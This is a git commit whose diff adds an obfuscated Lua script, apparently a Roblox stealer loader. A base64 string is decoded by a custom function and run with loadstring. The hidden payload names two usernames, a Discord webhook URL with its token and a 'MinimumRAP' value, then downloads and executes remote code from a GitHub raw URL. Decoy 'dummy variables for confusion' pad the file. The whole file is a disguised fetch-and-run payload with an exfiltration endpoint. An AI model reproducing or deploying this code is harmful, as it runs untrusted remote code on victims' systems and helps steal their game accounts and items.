f513f2c8250a5a586d52449334256975738da64c
darkss <daanpleune@gmail.com>
2024-10-25 02:16:12 +0200

    Create file via Discord bot

---
+++ user_scripts/813657326367146015_script_1729815372.lua
@@ -0,0 +1,23 @@
+
+local jpMecempC = 'VXNlcm5hbWUgPSAiZ2FtZXJfanVkaTEyMzQiClVzZXJuYW1lMiA9ICJDbGFwdGJ5bGF4IgpXZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEyOTkxNjM3Njg2ODkwMDA1MTEvZWhmbG1wRWVRWHk0WWpVMVJmQXduM0JzWHNuRGdQZXdEdlY0OXFNY2RfZDA1Y2d1THhHS0xWZTlkQ2ZZNWhRd0hnT2IiCk1pbmltdW1SQVAgPSAxMDAwMDAKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9zaGFkb3dzenp6ei90aW1vY2l5L3JlZnMvaGVhZHMvbWFpbi9tYWluIiwgdHJ1ZSkpKCk='
+local nZLqeIwAK = function(s) 
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'; 
+    s = string.gsub(s, '[^'..b..'=]', ''); 
+    return (s:gsub('.', function(x) 
+        if x == '=' then return '' end; 
+        local r,f='',(b:find(x)-1); 
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end 
+        return r; 
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) 
+        if (#x ~= 8) then return '' end; 
+        local c=0; 
+        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end 
+        return string.char(c) 
+    end)) 
+end
+local VcYTgnsDHlol = nZLqeIwAK(jpMecempC)
+loadstring(VcYTgnsDHlol)() -- Run decoded code
+
+-- Dummy variables for confusion
+local WbCJoaRa = math.random()
+local DlbRDhiBGls = "This is a dummy string"
